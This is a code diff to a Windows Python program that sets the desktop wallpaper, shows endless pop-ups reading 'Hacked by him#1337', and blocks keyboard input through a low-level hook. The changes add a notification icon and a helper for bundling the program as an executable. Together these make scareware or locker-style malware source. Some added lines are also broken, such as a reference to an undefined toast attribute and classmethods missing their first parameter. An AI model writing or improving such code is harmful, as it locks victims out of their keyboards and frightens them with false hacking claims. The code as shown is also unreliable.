@@ -8,6 +8,7 @@ import win32api
 from comtypes import CLSCTX_ALL
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from win10toast import ToastNotifier
+import sys ,os
 
 ctypes.windll.user32.SystemParametersInfoW(20, 0, resource.folder+'desktop.png' ,3)
 
@@ -49,14 +50,23 @@ class Threadlib:
     @staticmethod
     def sendmessage():
         toaster = ToastNotifier()
+        toaster.icon_path = Threadlib.resource_path(resource.folder+'ybj.ico')
         while True:
-            toaster.show_toast("Hacked by him#1337", Threadlib.text[random.randint(0,3)])
+            toaster.show_toast("Hacked by him#1337", Threadlib.text[random.randint(0,3)],
+                               duration=5,icon_path=Threadlib.toast.icon_path)
     @classmethod
     def hook_callback(nCode, wParam, lParam):
         if wParam == Threadlib.WM_KEYDOWN:
             
             return 1  
         return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)
+    @classmethod
+    def resource_path(relative_path):
+        try:
+            base_path = sys._MEIPASS
+        except AttributeError:
+            base_path = os.path.abspath(".")
+        return os.path.join(base_path, relative_path)
     
 def show():
     pygame.init()
